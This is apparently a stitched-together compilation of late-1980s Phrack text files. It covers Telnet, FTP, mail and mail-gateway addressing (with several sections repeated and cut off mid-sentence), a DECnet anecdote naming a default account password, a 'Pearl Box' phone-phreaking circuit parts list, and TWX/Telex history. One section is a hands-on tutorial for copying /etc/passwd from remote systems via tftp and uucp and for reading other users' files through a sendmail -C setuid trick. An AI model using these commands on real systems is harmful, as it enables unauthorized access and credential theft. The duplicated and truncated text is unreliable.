do "open umcvmb.missouri.edu"

Telnet will resolve (i.e. Translate, the hostname "umcvmb.missouri.edu" into an
IP address and will send a packet to that host requesting login.  If the remote
host decides to let you attempt a login, it prompts you for your username and
password.  If the host does not respond, Telnet will "time out" (i.e. Wait for
a reasonable amount of time such as 20 seconds) and then terminate with a
message such as "Host not responding."

If your computer does not have an entry for a remote host in its hosttable and
it cannot resolve the name, you can use the IP address explicitly in the telnet
command.  For example,

TELNET 26.0.0.73 (Note:  This is the IP address for the DDN Network Information
                 Center [SRI-NIC.ARPA])

If you are successful in logging in, your terminal is connected to the remote
host.  For all intents and purposes, your terminal is directly hard-wired to
that host and you should be able to do anything on your remote terminal that
you can do at any local terminal.  There are a few exceptions to this rule,
however.

Telnet provides a network escape character, such as CONTROL-T. You can find out
what the escape character is by entering the "status" subcommand:

Telnet> status

You can change the escape character by entering the "escape" subcommand:

Telnet> escape

When you type in the escape character, the Telnet prompt returns to your screen
and you can enter subcommands.  For example, to break the connection, which
usually logs you off the remote host, enter the subcommand "quit":

Telnet> quit

Your Telnet connection usually breaks when you log off the remote host, so the
"quit" subcommand is not usually used to log off.

When you are logged in to a remote computer via Telnet, remember that there is
a time delay between your local computer and the remote one.  This often
becomes apparent to users when scrolling a long file across the terminal screen
nd they wish to cancel the scrolling by typing CONTROL-C or something similar.
After typing the special control character, the scrolling continues.  The
special control character takes a certain amount of time to reach the remote
computer which is still scrolling information.  Thus response from the remote
computer will not likely be as quick as response from a local computer.

Once you are remotely logged on, the computer you are logged on to effectively
becomes your "local computer," even though your original "local computer" still
considers you logged on.  You can log on to a third computer which would then
become your "local computer" and so on.  As you log out of each session, your
previous session becomes active again.


File Transfer
~~~~~~~~~~~~~

FTP is the program that allows files to be sent from one computer to another.
"FTP" stands for "File Transfer Protocol".

When you start using FTP, a communications channel with another computer on the
network is opened.  For example, to start using FTP and initiate a file
transfer session with a computer on the network called "UMCVMB", you would
issue the following subcommand:

FTP UMCVMB.MISSOURI.EDU

Host "UMCVMB" will prompt you for an account name and password.  If your login
is correct, FTP will tell you so, otherwise it will say "login incorrect."  Try
again or abort the FTP program.  (This is usually done by typing a special
control character such as CONTROL-C.  The "program abort" character varies from
system to system.)

Next you will see the FTP prompt, which is:

Ftp>

There are a number of subcommands of FTP.  The subcommand "?" will list these
commands and a brief description of each one.

You can initiate a file transfer in either direction with FTP, either from the
remote host or to the remote host.  The "get" subcommand initiates a file
transfer from the remote host (i.e. Tells the remote computer to send the file
to the local computer [the one on which you issued the "ftp" command]).  Simply
enter "get" and  FTP will prompt you for the remote host's file name and the
(new) local host's file name.  Example:

Ftp> get
Remote file name?
theirfile
local file name?
myfile

ou can abbreviate this by typing both file names on the same line as the "get"
subcommand.  If you do not specify a local file name, the new local file will
be called the same thing as the remote file.  Valid FTP subcommands to get a
file include the following:

get theirfile myfile
get doc.x25

The "put" subcommand works in a similar fashion and is used to send a file from
the local computer to the remote computer.  Enter the command "put" and FTP
will prompt you for the local file name and then the remote file name.  If the
transfer cannot be done because the file doesn't exist or for some other
reason, FTP will print an error message.

There are a number of other subcommands in FTP that allow you to do many more
things.  Not all of these are standard so consult your local documentation or
type a question mark at the FTP prompt.  Some functions often built into FTP
include the ability to look at files before getting or putting them, the
ability to change directories, the ability to delete files on the remote
computer, and the ability to list the directory on the remote host.

An intriguing capability of many FTP implementations is "third party
transfers."  For example, if you are logged on computer A and you want to cause
computer B to send a file to computer C, you can use FTP to connect to computer
B and use the "rmtsend" command.  Of course, you have to know usernames and
passwords on all three computers, since FTP never allows you to peek into
someone's directory and files unless you know their username and password.

The "cd" subcommand changes your working directory on the remote host.  The
"lcd" subcommand changes the directory on the local host.  For UNIX systems,
the meaning of these subcommands is obvious.  Other systems, especially those
that do not have directory-structured file system, may not implement these
commands or may implement them in a different manner.

The "dir" and "ls" subcommands do the same thing, namely list the files in the
working directory of of the remote host.

The "list" subcommand shows the contents of a file without actually putting it
into a file on the local computer.  This would be helpful if you just wanted to
inspect a file.  You could interrupt it before it reached the end of the file
by typing CONTROL-C or some other special character.  This is dependent on your
FTP implementation.

The "delete" command can delete files on the remote host.  You can also make
and remove directories on the remote host with "mkdir" and "rmdir".  The
"status" subcommand will tell you if you are connected and with whom and what
the state of all your options are.

If you are transferring binary files or files with any non-printable
characters, turn binary mode on by entering the "binary" subcommand:

binary

To resume non-binary transfers, enter the "ascii" subcommand.

Transferring a number of files can be done easily by using "mput" (multiple
put) and "mget" (multiple get).  For example, to get every file in a particular
directory, first issue a "cd" command to  change to that directory and then an
"mget" command with an asterisk to indicate every file:

cd somedirectory
mget *

When you are done, use the "close" subcommand to break the communications link.
You will still be in FTP, so you must use the "bye" subcommand to exit FTP and
return to the command level.  The "quit" subcommand will close the connection
and exit from FTP at the same time.


Mail
~~~~
Mail is the simplest network facility to use in many ways.  All you have to do
is to create your message, which can be done with a file editor or on the spur
of the moment, and then send it.  Unlike FTP and Telnet, you do not need to
know the password of the username on the remote computer.  This is so because
you cannot change or access the files of the remote user nor can you use their
account to run programs.  All you can do is to send a message.

There is probably a program on your local computer which does mail between
users on that computer.  Such a program is called a mailer.  This may or may
not be the way to send or receive mail from other computers on the network,
although integrated mailers are more and more common.  UNIX mailers will be
used as an example in this discussion.

Note that the protocol which is used to send and receive mail over a TCP/IP
network is called SMTP, the "Simple Mail Transfer Protocol."  Typically, you
will not use any program called SMTP, but rather your local mail program.

UNIX mailers are usually used by invoking a program named "mail".  To receive
new mail, simply type "mail".

There are several varieties of UNIX mailers in existence.  Consult your local
documentation for details.  For example, the command "man mail" prints out the
manual pages for the mail program on your computer.

To send mail, you usually specify the address of the recipient on the mail
command.  For example: "mail knight@umcvmb.missouri.edu" will send the
following message to username "knight" on host "umcvmb".

You can usually type in your message one line at a time, pressing RETURN after
each line and typing CONTROL-D to end the message. Other facilities to include
already-existing files sometimes exist.  For example, Berkeley UNIXes allow you
to enter commands similar to the following to include a file in your current
mail message:

r myfile

In this example, the contents of "myfile" are inserted into the message at this
point.

Most UNIX systems allow you to send a file through the mail by using input
redirection.  For example:

mail knight@umcvmb.missouri.edu < myfile

In this example, the contents of "myfile" are sent as a message to "knight" on
"umcvmb."

Note that in many UNIX systems the only distinction between mail bound for
another user on the same computer and another user on a remote computer is
simply the address specified.  That is, there is no hostname for local
recipients.  Otherwise, mail functions in exactly the same way.  This is common
for integrated mail packages.  The system knows whether to send the mail
locally or through the network based on the address and the user is shielded
from any other details.

~~~~~~~~~~~~~~~~~~~~~~~~~~~
     DECnet is the network for DEC machines, in most cases you can say VAXes.
DECnet allows you to do:   - e-mail
                           - file transfer
                           - remote login
                           - remote command
                           - remote job entry
                           - PHONE
     PHONE is an interactive communication between users and is equal to TALK
on UNIX or a "deluxe"-CHAT on VM/CMS.

     BELWUE, the university network of the state Baden-Wuerttemberg in
West Germany contains (besides other networks) a DECnet with about 400 VAXes.
On every VAX there is standard-account called DECNET with pw:= DECNET, which is
not reachable via remote login.  This account is provided for several
DECnet-Utilities and as a pseudo-guest-account.  The DECNET-account has very
restricted privileges:  You cannot edit a file or make another remote login.

    The HELP-menu is equipped by the system and is similar to the MAN command
on UNIX.

    More information on DECnet can be found in "Looking Around In DECnet" by
Deep Thought in this very issue of Phrack Inc.

     Here, at the University of Ulm, we have an *incredibly* ignorant computer
center staff, with an even bigger lack of system-literature (besides the 80 kg
of VAX/VMS-manuals).  The active may search for information by himself, which
is over the level of "run," "FORTRAN," or "logout."  My good luck that I have
other accounts in the BELWUE-DECnet, where more information is offered for the
users.  I am a regular student in Ulm and all my accounts are completely legal
and corresponding to the German laws.  I don't call myself a "hacker," I feel
more like a "user" (...it's more a defining-problem).

     In the HELP-menu in a host in Tuebingen I found the file netdcl.com and
the corresponding explanation, which sends commands to the DECNET-Account of
other VAXes and executes them there (remote command).  The explanation in the
HELP-menu was idiot-proof -- therefore for me, too :-)

     With the command "$ mcr ncp show known nodes" you can obtain a list of all
netwide active VAXes, as is generally known, and so I pinged all these VAXes to
look for more information for a knowledge-thirsty user.  With "help", "dir" and
other similar commands I look around on those DECnet accounts, always watching
for topics related to the BELWUE-network.  It's a pity, that 2/3 of all VAXes
have locked the DECNET-Account for NETDCL.COM.  Their system managers are
probably afraid of unauthorized access, but I cannot imagine how there could be
such an unauthorized access, because you cannot log on this account -- no
chance for trojan horses, etc.

     Some system managers called me back after I visited their VAX to chat with
me about the network and asked me if they could help me in any way. One sysop
from Stuttgart even sent me a version of NETDCL.COM for the ULTRIX operation
system.

     Then, after a month, the  H O R R O R  came over me in shape of a the
following mail:

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
From:   TUEBINGEN::SYSTEM       31-MAY-1989 15:31:11.38
To:     FRAMSTAG
CC:
Subj:   don't make any crap, or you'll be kicked out!

From:   ITTGPX::SYSTEM       29-MAY-1989 16:46
To:     TUEBINGEN::SYSTEM
Subj:   System-breaking-in 01-May-1989

To the system manager of the Computer TUEBINGEN,

On May 1st 1989 we had a System-breaking-in in our DECNET-account, which
started from your machine.  By help of our accounting we ascertained your user
FRAMSTAG to have emulated an interactive log-on on our backbone-node and on
every machine of our VAX-cluster with the "trojan horse" NETDCL.COM.  Give us
this user's name and address and dear up the occurrence completely.  We point
out that the user is punishable.  In case of repetition we would be forced to
take corresponding measures.  We will check whether our system got injured.  If
not, this time we will disregard any measure.  Inform us via DECnet about your
investigation results -- we are attainable by the nodenumber 1084::system

Dipl.-Ing. Michael Hager
--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

     My system manager threatened me with the deleting of my account, if I
would not immediately enlighten the affair.  *Gulp*!
     I was conscious about my innocence, but how to tell it to the others?  I
explained, step by step, everything to my system manager.  He then understood
after a while, but the criminal procedure still hovered over me... so, I took
quickly to my keyboard, to compose file of explanations and to send it to that
angry system manager in Stuttgart (node 1084 is an institute there).  But no
way out:  He had run out of disk quota and my explanation-mail sailed into the
nirwana:

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
$ mail explanation
  To:   1084::system
%MAIL-E, error sending to user SYSTEM at 1084
%MAIL-E-OPENOUT, error opening SYS$SYSROOT:[SYSMGR]MAIL$00040092594FD194.MAI;
as output
-RMS-E-CRE, ACP file create failed
-SYSTEM-F-EXDISKQUOTA, disk quota exceeded
--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

     Also the attempt of a connection with the PHONE-facilty failed:  In his
borderless hacker-paranoia, he cut off his PHONE... and nowhere is a list with
the REAL-addresses of the virtual DECnet-addresses available (to prevent
hacking).  Now I stood there with the brand "DANGEROUS HACKER!" and I had no
chance to vindicate myself.  I poured out my troubles to an acquaintance of
mine, who is a sysop in the computer-center in Freiburg.  He asked other sysops
and managers thru the whole BELWUE-network until someone gave him a telephone
number after a few days -- and that was the right one!

     I phoned to this Hager and told him what I had done with his
DECnet-account and also what NOT.  I wanted to know which crime I had
committed.  He promptly cancelled all of his reproaches, but he did not excuse
his defamous incriminations.  I entreated him to inform my system manager in
Tuebingen that I have done nothing illegal and to stop him from erasing my
account.  This happens already to a fellow student of mine (in this case, Hager
was also guilty).  He promised me that he would officially cancel his
reproaches.

     After over a week this doesn't happen (I'm allowed to use my account
further on).  In return for it, I received a new mail from Hager on another
account of mine:

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
From:   1084::HAGER         1-JUN-1989 12:51
To:     50180::STUD_11
Subj:   System-breaking-in

On June 1st 1989 you have committed a system-breaking-in on at least one of our
VAXes.  We were able to register this occurrence.  We would be forced to take
further measure if you did not dear up the occurrence completely until June
6th.

Of course the expenses involved would be imposed on you.  Hence enlightenment
must be in your own interest.

We are attainable via DECnet-mail with the address 1084::HAGER or via following

This was the reaction of my attempt: "$ PHONE 1084::SYSTEM".  I have not
answered to this mail.  I AM SICK OF IT!

ACSNET
~~~~~~
Australian Computer Science Network (ACSNET), also known as Oz, has its gateway
through the CSNET node munnari.oz.au and if you cannot directly mail to the
oz.au domain, try either username%munnari.oz.au@UUNET.UU.NET or
munnari!username@UUNET.UU.NET.
 
AT&T MAIL
~~~~~~~~~
AT&T Mail is a mailing service of AT&T, probably what you might call it's
MCI-Mail equivalent.  It is available on the UUCP network as node name attmail
but I've had problems having mail get through.  Apparently, it does cost money
to mail to this service and the surrounding nodes are not willing to pick up
the tab for the ingoing mail, or at least, this has seemingly been the case
thus far.  I believe, though, that perhaps routing to att!attmail!user would
work.
 
AT&T recently announced six new X.400 interconnections between AT&T Mail and
electronic mail services in the U.S., Korea, Sweden, Australia, and Finland.
In the U.S., AT&T Mail is now interconnected with Telenet Communications
Corporation's service, Telemail, allowing users of both services to exchange
messages easily.  With the addition of these interconnections, the AT&T Mail
Gateway 400 Service allows AT&T Mail subscribers to exchange messages with
users of the following electronic messaging systems:
 
Company                    E-Mail Name*            Country
-------                    ------------            -------
TeleDelta                  TeDe 400                Sweden
OTC                        MPS400                  Australia
Telecom-Canada             Envoy100                Canada
DACOM                      DACOM MHS               Korea
P&T-Tele                   MailNet 400             Finland
Helsinki Telephone Co.     ELISA                   Finland
Dialcom                    Dialcom                 USA
Telenet                    Telemail                USA
KDD                        Messavia                Japan
Transpac                   ATLAS400                France
 
The interconnections are based on the X.400 standard, a set of guidelines for
the format, delivery and receipt of electronic messages recommended by an
international standards committee the CCITT.  International X.400 messages
incur a surcharge.  They are:
 
                 To Canada:
                    Per note:            $.05
                    Per message unit:    $.10
 
                 To other international locations:
                    Per note:            $.20
                    Per message unit:    $.50
 
There is no surcharge for X.400 messages within the U.S.  The following are
contacts to speak with about mailing through these mentioned networks.  Other
questions can be directed through AT&T Mail's toll-free number, 1-800-624-5672.

CMR
~~~
Previously known as Intermail, the Commercial Mail Relay (CMR) Service is a
mail relay service between the Internet and three commercial electronic mail
systems:  US Sprint/Telenet, MCI-Mail, and DIALCOM systems (i.e. Compmail,
NSFMAIL, and USDA-MAIL).
 
An important note:  The only requirement for using this mail gateway is that
the work conducted must be DARPA sponsored research and other approved
government business.  Basically, this means that unless you've got some
government-related business, you're not supposed to be using this gateway.
Regardless, it would be very difficult for them to screen everything that goes
through their gateway.  Before I understood the requirements of this gateway, I
was sending to a user of MCI-Mail and was not contacted about any problems with
that communication.  Unfortunately, I mistyped the MCI-Mail address on one of
the letters and that letter ended up getting read by system administrators who
then informed me that I was not to be using that system, as well as the fact
that they would like to bill me for using it.  That was an interesting thought
on their part anyway, but do note that using this service does incur charges.
 
The CMR mailbox address in each system corresponds to the label:
 
          Telemail:  [Intermail/USCISI]TELEMAIL/USA
          MCI-Mail:  Intermail      or      107-8239
          CompMail:  Intermail      or      CMP0817
          NSF-Mail:  Intermail      or      NSF153
         USDA-Mail:  Intermail      or      AGS9999
 
Addressing examples for each e-mail system are as follows:
 
MCIMAIL:
   123-4567             seven digit address
   Everett T. Bowens    person's name (must be unique!)
 
COMPMAIL:
   CMP0123              three letters followed by three or four digits
   S.Cooper             initial, then "." and then last name
   134:CMP0123          domain, then ":" and then combination system and
                        account number
 
NSFMAIL:
   NSF0123              three letters followed by three or four digits
   A.Phillips           initial, then "." and then last name
   157:NSF0123          domain, then ":" and then combination system and
                         account number
 
USDAMAIL:
   AGS0123              three letters followed by three or four digits
   P.Shifter            initial, then "." and then last name
   157:AGS0123          domain, then ":" and then combination system and
                         account number
 
TELEMAIL:
   BARNOC               user (directly on Telemail)
   BARNOC/LODH          user/organization (directly on Telemail)
   [BARNOC/LODH]TELEMAIL/USA
                         [user/organization]system branch/country
 
The following are other Telenet system branches/countries that can be mailed
to:
 
TELEMAIL/USA     NASAMAIL/USA     MAIL/USA            TELEMEMO/AUSTRALIA
TELECOM/CANADA   TOMMAIL/CHILE    TMAILUK/GB          ITALMAIL/ITALY

USDA/USA
 
     Note:  OMNET's ScienceNet is on the Telenet system MAIL/USA and to mail to
it, the format would be [A.MAILBOX/OMNET]MAIL/USA.  The following are available

 NOTE:  You can also mail to username@NASAMAIL.NASA.GOV or
        username@GSFCMAIL.NASA.GOV instead of going through the CMR gateway to
        mail to NASAMAIL or GSFCMAIL.
 
For more information and instructions on how to use CMR, send a message to the
user support group at intermail-request@intermail.isi.edu (you'll get basically
what I've listed plus maybe a bit more).  Please read Chapter 3 of The Future
Transcendent Saga (Limbo to Infinity) for specifics on mailing to these
destination mailing systems.
 
COMPUSERVE
~~~~~~~~~~
CompuServe is well known for its games and conferences.  It does, though, have
mailing capability.  Now, they have developed their own Internet domain, called
COMPUSERVE.COM.  It is relatively new and mail can be routed through either
TUT.CIS.OHIO-STATE.EDU or NORTHWESTERN.ARPA.
 
Example: user%COMPUSERVE.COM@TUT.CIS.OHIO-STATE.EDU or replace
         TUT.CIS.OHIO-STATE.EDU with NORTHWESTERN.ARPA).
 
The CompuServe link appears to be a polled UUCP connection at the gateway
machine.  It is actually managed via a set of shell scripts and a comm utility
called xcomm, which operates via command scripts built on the fly by the shell
scripts during analysis of what jobs exist to go into and out of CompuServe.
 
CompuServe subscriber accounts of the form 7xxxx,yyyy can be addressed as
7xxxx.yyyy@compuserve.com.  CompuServe employees can be addressed by their
usernames in the csi.compuserve.com subdomain.  CIS subscribers write mail to
">inet:user@host.domain" to mail to users on the Wide-Area Networks, where
">gateway:" is CompuServe's internal gateway access syntax.  The gateway
generates fully-RFC-compliant headers.
 
To fully extrapolate -- from the CompuServe side, you would use their EasyPlex
mail system to send mail to someone in BITNET or the Internet.   For example,
to send me mail at my Bitnet id, you would address it to:
 
            INET:C488869%UMCVMB.BITNET@CUNYVM.CUNY.EDU
 
Or to my Internet id:
 
            INET:C488869@UMCVMB.MISSOURI.EDU
 
Now, if you have a BITNET to Internet userid, this is a silly thing to do,
since your connect time to CompuServe costs you money.  However, you can use
this information to let people on CompuServe contact YOU.  CompuServe Customer
Service says that there is no charge to either receive or send a message to the
Internet or BITNET.
 
DASNET
~~~~~~
DASnet is a smaller network that connects to the Wide-Area Networks but charges
for their service.  DASnet subscribers get charged for both mail to users on
other networks AND mail for them from users of other networks.  The following
is a brief description of DASnet, some of which was taken from their
promotional text letter.
 
DASnet allows you to exchange electronic mail with people on more than 20
systems and networks that are interconnected with DASnet.  One of the
drawbacks, though, is that, after being subscribed to these services, you must
then subscribe to DASnet, which is a separate cost.  Members of Wide-Area
networks can subscribe to DASnet too.  Some of the networks and systems
reachable through DASnet include the following:
 
     ABA/net, ATT Mail, BIX (Byte Information eXchange), DASnet Network,
     Dialcom, EIES, EasyLink, Envoy 100, FAX, GeoMail, INET, MCI Mail, NWI,
     PeaceNet/EcoNet, Portal Communications, The Meta Network, The Source,
     Telemail, ATI's Telemail (Japan), Telex, TWICS (Japan), UNISON, UUCP, The
     WELL, and Domains (i.e. ".COM" and ".EDU" etc.).  New systems are added
     all of the time.  As of the writing of this file, Connect, GoverNET,
     MacNET, and The American Institute of Physics PI-MAIL are soon to be
     connected.
 
You can get various accounts on DASnet including:
 
  o  Corporate Accounts -- If your organization wants more than one individual
                           subscription.
  o  Site Subscriptions -- If you want DASnet to link directly to your
                           organization's electronic mail system.
 
To send e-mail through DASnet, you send the message to the DASnet account on
your home system.  You receive e-mail at your mailbox, as you do now.  On the
Wide-Area Networks, you send mail to XB.DAS@STANFORD.BITNET.  On the Subject:
line, you type the DASnet address in brackets and then the username just
outside of them.  The real subject can be expressed after the username
separated by a "!"  (Example:  Subject:  [0756TK]randy!How's Phrack?).
 
The only disadvantage of using DASnet as opposed to Wide-Area networks is the
cost.  Subscription costs as of 3/3/89 cost $4.75 per month or $5.75 per month
for hosts that are outside of the U.S.A.
 
You are also charged for each message that you send.  If you are corresponding
with someone who is not a DASnet subscriber, THEIR MAIL TO YOU is billed to
your account.
 
The following is an abbreviated cost list for mailing to the different services
of DASnet:

auto-porting or DASnet Telex Service which gives you your own Telex number and
answerback for $8.40 a month at this time.

CMR
~~~
Previously known as Intermail, the Commercial Mail Relay (CMR) Service is a
mail relay service between the Internet and three commercial electronic mail
systems:  US Sprint/Telenet, MCI-Mail, and DIALCOM systems (i.e. Compmail,
NSFMAIL, and USDA-MAIL).
 
An important note:  The only requirement for using this mail gateway is that
the work conducted must be DARPA sponsored research and other approved
government business.  Basically, this means that unless you've got some
government-related business, you're not supposed to be using this gateway.
Regardless, it would be very difficult for them to screen everything that goes
through their gateway.  Before I understood the requirements of this gateway, I
was sending to a user of MCI-Mail and was not contacted about any problems with
that communication.  Unfortunately, I mistyped the MCI-Mail address on one of
the letters and that letter ended up getting read by system administrators who
then informed me that I was not to be using that system, as well as the fact
that they would like to bill me for using it.  That was an interesting thought
on their part anyway, but do note that using this service does incur charges.
 
The CMR mailbox address in each system corresponds to the label:
 
          Telemail:  [Intermail/USCISI]TELEMAIL/USA
          MCI-Mail:  Intermail      or      107-8239
          CompMail:  Intermail      or      CMP0817
          NSF-Mail:  Intermail      or      NSF153
         USDA-Mail:  Intermail      or      AGS9999
 
Addressing examples for each e-mail system are as follows:
 
MCIMAIL:
   123-4567             seven digit address
   Everett T. Bowens    person's name (must be unique!)
 
COMPMAIL:
   CMP0123              three letters followed by three or four digits
   S.Cooper             initial, then "." and then last name
   134:CMP0123          domain, then ":" and then combination system and
                        account number
 
NSFMAIL:
   NSF0123              three letters followed by three or four digits
   A.Phillips           initial, then "." and then last name
   157:NSF0123          domain, then ":" and then combination system and
                         account number
 
USDAMAIL:
   AGS0123              three letters followed by three or four digits
   P.Shifter            initial, then "." and then last name
   157:AGS0123          domain, then ":" and then combination system and
                         account number
 
TELEMAIL:
   BARNOC               user (directly on Telemail)
   BARNOC/LODH          user/organization (directly on Telemail)
   [BARNOC/LODH]TELEMAIL/USA
                         [user/organization]system branch/country
 
The following are other Telenet system branches/countries that can be mailed
to:
 
TELEMAIL/USA     NASAMAIL/USA     MAIL/USA            TELEMEMO/AUSTRALIA
TELECOM/CANADA   TOMMAIL/CHILE    TMAILUK/GB          ITALMAIL/ITALY

USDA/USA
 
     Note:  OMNET's ScienceNet is on the Telenet system MAIL/USA and to mail to
it, the format would be [A.MAILBOX/OMNET]MAIL/USA.  The following are available
subdivisions of OMNET:

 NOTE:  You can also mail to username@NASAMAIL.NASA.GOV or
        username@GSFCMAIL.NASA.GOV instead of going through the CMR gateway to
        mail to NASAMAIL or GSFCMAIL.
 
For more information and instructions on how to use CMR, send a message to the
user support group at intermail-request@intermail.isi.edu (you'll get basically
what I've listed plus maybe a bit more).  Please read Chapter 3 of The Future
Transcendent Saga (Limbo to Infinity) for specifics on mailing to these
destination mailing systems.
 
COMPUSERVE
~~~~~~~~~~
CompuServe is well known for its games and conferences.  It does, though, have
mailing capability.  Now, they have developed their own Internet domain, called
COMPUSERVE.COM.  It is relatively new and mail can be routed through either
TUT.CIS.OHIO-STATE.EDU or NORTHWESTERN.ARPA.
 
Example: user%COMPUSERVE.COM@TUT.CIS.OHIO-STATE.EDU or replace
         TUT.CIS.OHIO-STATE.EDU with NORTHWESTERN.ARPA).
 
The CompuServe link appears to be a polled UUCP connection at the gateway
machine.  It is actually managed via a set of shell scripts and a comm utility
called xcomm, which operates via command scripts built on the fly by the shell
scripts during analysis of what jobs exist to go into and out of CompuServe.
 
CompuServe subscriber accounts of the form 7xxxx,yyyy can be addressed as
7xxxx.yyyy@compuserve.com.  CompuServe employees can be addressed by their
usernames in the csi.compuserve.com subdomain.  CIS subscribers write mail to
">inet:user@host.domain" to mail to users on the Wide-Area Networks, where
">gateway:" is CompuServe's internal gateway access syntax.  The gateway
generates fully-RFC-compliant headers.
 
To fully extrapolate -- from the CompuServe side, you would use their EasyPlex
mail system to send mail to someone in BITNET or the Internet.   For example,
to send me mail at my Bitnet id, you would address it to:
 
            INET:C488869%UMCVMB.BITNET@CUNYVM.CUNY.EDU
 
Or to my Internet id:
 
            INET:C488869@UMCVMB.MISSOURI.EDU
 
Now, if you have a BITNET to Internet userid, this is a silly thing to do,
since your connect time to CompuServe costs you money.  However, you can use
this information to let people on CompuServe contact YOU.  CompuServe Customer
Service says that there is no charge to either receive or send a message to the
Internet or BITNET.
 
DASNET
~~~~~~
DASnet is a smaller network that connects to the Wide-Area Networks but charges
for their service.  DASnet subscribers get charged for both mail to users on
other networks AND mail for them from users of other networks.  The following
is a brief description of DASnet, some of which was taken from their

DASnet allows you to exchange electronic mail with people on more than 20
systems and networks that are interconnected with DASnet.  One of the
drawbacks, though, is that, after being subscribed to these services, you must
then subscribe to DASnet, which is a separate cost.  Members of Wide-Area
networks can subscribe to DASnet too.  Some of the networks and systems
reachable through DASnet include the following:
 
     ABA/net, ATT Mail, BIX (Byte Information eXchange), DASnet Network,
     Dialcom, EIES, EasyLink, Envoy 100, FAX, GeoMail, INET, MCI Mail, NWI,
     PeaceNet/EcoNet, Portal Communications, The Meta Network, The Source,
     Telemail, ATI's Telemail (Japan), Telex, TWICS (Japan), UNISON, UUCP, The
     WELL, and Domains (i.e. ".COM" and ".EDU" etc.).  New systems are added
     all of the time.  As of the writing of this file, Connect, GoverNET,
     MacNET, and The American Institute of Physics PI-MAIL are soon to be
     connected.
 
You can get various accounts on DASnet including:
 
  o  Corporate Accounts -- If your organization wants more than one individual
                           subscription.

Introduction:  After reading the earlier renditions of schematics for the Pearl
               Box, I decided that there was an easier and cheaper way of doing
               the same thing with an IC and parts you probably have just
               laying around the house.
 
 
What Is A Pearl Box and Why Do I Want One?
 
     A Pearl Box is a tone generating device that is used to make a wide range
     of single tones.  Therefore, it would be very easy to modify this basic
     design to make a Blue Box by making 2 Pearl Boxes and joining them
     together in some fashion.
 
     A Pearl Box can be used to create any tone you wish that other boxes may
     not.  It also has a tone sweep option that can be used for numerous things
     like detecting different types of phone tapping devices.
 
 
Parts List:
 
        CD4049 RCA integrated circuit
        .1 uF disk capacitor
        1 uF 16V electrolitic capacitor
        1K resistor
        10M resistor
        1meg pot
        1N914 diode
        Some SPST momentary push-button switches
        1 SPDT toggle switch
        9 Volt battery & clip
        and miscellaneous stuff you should have laying around the house.

There are many ways of getting copies of files from a remote system that you
do not have permission to read or an account on login on to and access them
through.  Many administrators do not even bother to restrict many access
points that you can use.
 
Here are the simplest ways:
 
 
A)  Use uucp(1) [Trivial File Transfer Protocol] to retrieve a copy
    of a file if you are running on an Internet based network.
 
B) Abuse uucp(1) [Unix to Unix Copy Program] to retrieve a copy of a file
   if uucp connections are running on that system.
 
C) Access one of many known security loopholes.
 
 
In the following examples, we will use the passwd file as the file to acquire
since it is a readable file that can be found on most systems that these
attacks are valid on.
 
Method A :
 
1) First start the tftp program:
    Enter the command:
 
 tftp
 
    [You have the following prompt:]
 
 tftp>
 
 
2) The next step is to connect to the system that you wish to retrieve files
    from.  At the tftp, type:
 
 tftp> connect other.system.com
 
 
3) Now request the file you wish to get a copy of (in our case, the
    passwd file /etc/passwd ):
 
 tftp> get /etc/passwd /tmp/passwd
 
    [You should see something that looks like the following:]
 
 Received 185659 bytes in 22 seconds.
 
4) Now exit the tftp program with the "quit" command:
 
 tftp> quit
 
You should now have a copy of other.system.com's passwd file in your directory.
 
NOTE:  Some Unix systems' tftp programs have a different syntax.  The above was
       tested under SunOS 4.0
 
For example, on Apollos, the syntax is:
 
    tftp -{g|g!|p|r|w} <local file> <host> <foreign file> [netascii|image]
 
Thus you must use the command:
 
 tftp -g password_file networked-host /etc/passwd
 
Consult your local "man" pages for more info (or in other words RTFM).
 
At the end of this article, I will include a shell script that will snarf a
password file from a remote host.  To use it type:
 
 gpw system_name
 
Method B :
 
Assuming we are getting the file  /etc/passwd  from the system uusucker, and
our system has a direct uucp connection to that system, it is possible to
request a copy of the file through the uucp links.  The following command will
request that a copy of the passwd file be copied into uucp's home directory
/usr/spool/uucppublic :
 
 uucp -m uusucker!/etc/passwd '>uucp/uusucker_passwd'
 
The flag "-m" means you will be notified by mail when the transfer is
completed.
 
Method C:
 
    The third possible way to access the desired file requires that you have
the login permission to the system.
 
In this case we will utilize a well-known bug in Unix's sendmail daemon.
 
The sendmail program has and option "-C" in which you can specify the
configuration file to use (by default this file is /usr/lib/sendmail.cf or
/etc/sendmail.cf).  It should also be noted that the diagnostics outputted by
sendmail contain the offending lines of text.  Also note that the sendmail
program runs setuid root.
 
The way you can abuse this set of facts (if you have not yet guessed) is by
specifying the file you wish read as the configuration file.  Thus the command:
 
 sendmail -C/usr/accounts/random_joe/private/file
 
Will give you a copy of random joe's private file.
 
Another similar trick is to symlink your .mailcf file to joe's file and mail
someone.  When mail executes sendmail (to send the mail), it will load in your
mailcf and barf out joe's stuff.
 
First, link joe's file to your .mailcf .
 
 ln -s /usr/accounts/random_joe/private/file $HOME/.mailcf
 
Next, send mail to someone.
 
 mail C488869@umcvmb.missouri.edu
 
And have fun.

         "Until a few years ago -- maybe ten -- it was very common to
          see TWX and Telex machines in almost every business place."
 
There were only minor differences between Telex and TWX.  The biggest
difference was that the former was always run by Western Union, while the
latter was run by the Bell System for a number of years.  TWX literally meant
"(T)ype(W)riter e(x)change," and it was Bell's answer to competition from
Western Union.  There were "three row" and "four row" machines, meaning the
number of keys on the keyboard and how they were laid out.  The "three row"
machines were simply part of the regular phone network; that is, they could
dial out and talk to another TWX also connected on regular phone lines.
 
Eventually these were phased out in favor of "newer and more improved" machines
with additional keys, as well as a paper tape reader attachment which allowed
sending the same message repeatedly to many different machines.  These "four
row" machines were not on the regular phone network, but were assigned their
own area codes (410-510-610-710-810-910) where they still remain today.  The
only way a four row machine could call a three row machine or vice-versa was
through a gateway of sorts which translated some of the character set unique to
each machine.
 
Western Union's network was called Telex and in addition to being able to
contact (by dial up) other similar machines, Telex could connect with TWX (and
vice-versa) as well as all the Western Union public offices around the country.
Until the late 1950's or early 1960's, every small town in America had a
Western Union office.  Big cities like Chicago had perhaps a dozen of them, and
they used messengers to hand deliver telegrams around town.  Telegrams could be
